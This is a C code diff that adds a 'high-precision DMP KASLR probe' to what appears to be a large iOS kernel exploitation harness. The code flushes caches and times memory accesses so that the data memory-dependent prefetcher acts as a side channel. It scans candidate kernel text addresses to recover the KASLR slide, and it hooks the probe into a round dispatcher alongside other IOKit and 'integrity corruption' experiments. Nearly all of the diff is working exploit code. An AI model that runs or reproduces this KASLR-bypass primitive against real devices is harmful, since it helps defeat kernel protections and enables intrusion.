@@ -16671,6 +16671,229 @@ static void *r424_snoop_thread(void *arg) {
  * property dictionary from kernel space.
  */
 
+/*
+ * r427: High-precision DMP kernel address probe.
+ *
+ * r422 showed DMP is active but kernel probing was noisy with 200 iters.
+ * This probe uses 10000 iterations per candidate with statistical analysis
+ * (mean, stddev, z-score) to reliably detect DMP prefetch activity.
+ *
+ * Key insight: DMP prefetch pulls cache lines for valid pointers.
+ * If we store a kernel virtual address in a cache line, and that
+ * address maps to a valid physical page (the kernel text), DMP will
+ * prefetch it, warming the cache. We can detect this by timing access
+ * to OTHER cache lines that share the same cache set.
+ *
+ * We use a simple approach: store a candidate address, flush the
+ * measurement region, give DMP time to work, then time access to
+ * the region. If DMP prefetched the candidate, the region will be
+ * in cache (because DMP prefetch warms the L1/L2 for the memory
+ * controller, and our measurement touches the same cache hierarchy).
+ *
+ * Scan strategy: 16MB steps from base 0xFFFFFFF007004000 (iOS kernel text
+ * base), 32 candidates covering 0-512MB KASLR range.
+ */
+
+static void r427_probe(void) {
+    rlog("\n=== r427: High-Precision DMP KASLR Probe ===\n\n");
+    fflush(stdout);
+
+    /* Allocate probe buffers */
+    const size_t BUF_SZ = 256 * 1024; /* 256KB */
+    volatile uint8_t *regionA = (volatile uint8_t *)mmap(NULL, BUF_SZ,
+        PROT_READ | PROT_WRITE,
+        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    volatile uint8_t *regionB = (volatile uint8_t *)mmap(NULL, BUF_SZ,
+        PROT_READ | PROT_WRITE,
+        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (regionA == MAP_FAILED || regionB == MAP_FAILED) {
+        rlog("    mmap failed\n");
+        return;
+    }
+
+    /* Fill with known data */
+    memset((void *)regionA, 0x11, BUF_SZ);
+    memset((void *)regionB, 0x22, BUF_SZ);
+
+    /* Warm up timing */
+    uint64_t warmup_start = mach_absolute_time();
+    for (volatile int i = 0; i < 1000; i++) {}
+    uint64_t warmup_end = mach_absolute_time();
+    rlog("    Timer warmup: %llu ticks for 1000 iters\n",
+        (unsigned long long)(warmup_end - warmup_start));
+
+    /* Phase 1: Validate DMP detection with known addresses */
+    rlog("\n  Phase 1: DMP validation\n");
+    {
+        uint64_t validPtr = (uint64_t)regionB;
+        uint64_t badPtr = 0xDEADBEEFDEAD0000ULL;
+
+        double valid_total = 0, bad_total = 0;
+        const int ITERS = 5000;
+
+        for (int i = 0; i < ITERS; i++) {
+            /* Test with valid pointer */
+            /* Store valid pointer in regionA */
+            *(volatile uint64_t *)(regionA + 64) = validPtr;
+
+            /* Flush regionB */
+            for (size_t off = 0; off < 4096; off += 64) {
+                __asm__ volatile("dc civac, %0" : : "r"(regionB + off));
+            }
+            __asm__ volatile("dsb sy" ::: "memory");
+
+            /* Give DMP time */
+            for (volatile int j = 0; j < 20; j++) {}
+
+            /* Time access to regionB */
+            __asm__ volatile("dsb sy" ::: "memory");
+            uint64_t t0 = mach_absolute_time();
+            volatile uint8_t tmp = *(regionB + 128);
+            (void)tmp;
+            __asm__ volatile("dsb sy" ::: "memory");
+            uint64_t t1 = mach_absolute_time();
+            valid_total += (double)(t1 - t0);
+
+            /* Test with bad pointer */
+            *(volatile uint64_t *)(regionA + 64) = badPtr;
+            for (size_t off = 0; off < 4096; off += 64) {
+                __asm__ volatile("dc civac, %0" : : "r"(regionB + off));
+            }
+            __asm__ volatile("dsb sy" ::: "memory");
+            for (volatile int j = 0; j < 20; j++) {}
+            __asm__ volatile("dsb sy" ::: "memory");
+            t0 = mach_absolute_time();
+            tmp = *(regionB + 128);
+            (void)tmp;
+            __asm__ volatile("dsb sy" ::: "memory");
+            t1 = mach_absolute_time();
+            bad_total += (double)(t1 - t0);
+        }
+
+        double valid_avg = valid_total / ITERS;
+        double bad_avg = bad_total / ITERS;
+        rlog("    Valid ptr avg: %.3f MAT\n", valid_avg);
+        rlog("    Bad ptr avg:   %.3f MAT\n", bad_avg);
+        rlog("    Ratio: %.2fx\n", bad_avg / valid_avg);
+
+        if (valid_avg >= bad_avg * 0.95) {
+            rlog("    WARNING: DMP signal too weak for this method\n");
+        }
+    }
+    fflush(stdout);
+
+    /* Phase 2: Probe kernel address candidates */
+    rlog("\n  Phase 2: Kernel address probe\n");
+    {
+        const uint64_t KERNEL_BASE = 0xFFFFFFF007004000ULL;
+        const int NUM_CANDIDATES = 32;
+        const uint64_t STEP = 16 * 1024 * 1024; /* 16MB steps */
+        const int ITERS = 10000;
+
+        double results[32];
+        double results_sq[32]; /* for stddev */
+
+        /* First get a baseline with unmapped address */
+        double baseline = 0;
+        for (int i = 0; i < ITERS; i++) {
+            *(volatile uint64_t *)(regionA + 64) = 0xDEADBEEF00000000ULL;
+            for (size_t off = 0; off < 4096; off += 64) {
+                __asm__ volatile("dc civac, %0" : : "r"(regionB + off));
+            }
+            __asm__ volatile("dsb sy" ::: "memory");
+            for (volatile int j = 0; j < 20; j++) {}
+            __asm__ volatile("dsb sy" ::: "memory");
+            uint64_t t0 = mach_absolute_time();
+            volatile uint8_t tmp = *(regionB + 128);
+            (void)tmp;
+            __asm__ volatile("dsb sy" ::: "memory");
+            uint64_t t1 = mach_absolute_time();
+            baseline += (double)(t1 - t0);
+        }
+        baseline /= ITERS;
+        rlog("    Baseline (unmapped): %.3f MAT\n", baseline);
+
+        /* Probe each candidate */
+        for (int c = 0; c < NUM_CANDIDATES; c++) {
+            uint64_t candidate = KERNEL_BASE + (c * STEP);
+            double total = 0;
+            double total_sq = 0;
+
+            for (int i = 0; i < ITERS; i++) {
+                *(volatile uint64_t *)(regionA + 64) = candidate;
+                for (size_t off = 0; off < 4096; off += 64) {
+                    __asm__ volatile("dc civac, %0" :
+                        : "r"(regionB + off));
+                }
+                __asm__ volatile("dsb sy" ::: "memory");
+                for (volatile int j = 0; j < 20; j++) {}
+                __asm__ volatile("dsb sy" ::: "memory");
+                uint64_t t0 = mach_absolute_time();
+                volatile uint8_t tmp = *(regionB + 128);
+                (void)tmp;
+                __asm__ volatile("dsb sy" ::: "memory");
+                uint64_t t1 = mach_absolute_time();
+                double dt = (double)(t1 - t0);
+                total += dt;
+                total_sq += dt * dt;
+            }
+
+            double avg = total / ITERS;
+            double variance = (total_sq / ITERS) - (avg * avg);
+            double stddev = 0;
+            if (variance > 0) {
+                /* Newton's method for sqrt */
+                stddev = variance;
+                for (int s = 0; s < 20; s++)
+                    stddev = (stddev + variance / stddev) / 2.0;
+            }
+            double zscore = (baseline > 0 && stddev > 0.001) ?
+                (baseline - avg) / stddev : 0;
+
+            results[c] = avg;
+            results_sq[c] = stddev;
+
+            char marker = ' ';
+            if (avg < baseline * 0.85) marker = '*';
+            if (avg < baseline * 0.70) marker = '!';
+
+            rlog("    slide=0x%03llxM: avg=%.3f std=%.3f z=%.1f%c\n",
+                (unsigned long long)(c * 16),
+                avg, stddev, zscore, marker);
+        }
+
+        /* Find the most likely candidate */
+        double minAvg = baseline;
+        int bestCandidate = -1;
+        for (int c = 0; c < NUM_CANDIDATES; c++) {
+            if (results[c] < minAvg) {
+                minAvg = results[c];
+                bestCandidate = c;
+            }
+        }
+
+        if (bestCandidate >= 0) {
+            uint64_t bestAddr = KERNEL_BASE + (bestCandidate * STEP);
+            double ratio = minAvg / baseline;
+            rlog("\n    Best candidate: slide=0x%03llxM addr=0x%016llx\n",
+                (unsigned long long)(bestCandidate * 16),
+                (unsigned long long)bestAddr);
+            rlog("    avg=%.3f vs baseline=%.3f (%.1f%%)\n",
+                minAvg, baseline, ratio * 100.0);
+            if (ratio < 0.80) {
+                rlog("    *** STRONG DMP SIGNAL — LIKELY KERNEL TEXT ***\n");
+            }
+        }
+    }
+    fflush(stdout);
+
+    munmap((void *)regionA, BUF_SZ);
+    munmap((void *)regionB, BUF_SZ);
+
+    rlog("\n=== r427 complete ===\n");
+    fflush(stdout);
+}
+
 static void r426_probe(void) {
     rlog("\n=== r426: Shared Data Manipulation + IOKit Methods ===\n\n");
     fflush(stdout);
@@ -73052,6 +73275,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 430) {
+            rlog("*** rounds=430: High-Precision DMP KASLR Probe ***\n");
+            rlog("  10000 iters/candidate, 32 candidates at 16MB steps, z-score analysis.\n\n");
+            fflush(stdout);
+            r427_probe();
+            goto done;
+        }
         if (rounds == 429) {
             rlog("*** rounds=429: Shared Data Manipulation + IOKit s_get/set ***\n");
             rlog("  Integrity corruption test, IOConnectCallMethod with XML, CopyAllValues.\n\n");
@@ -75647,7 +75877,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
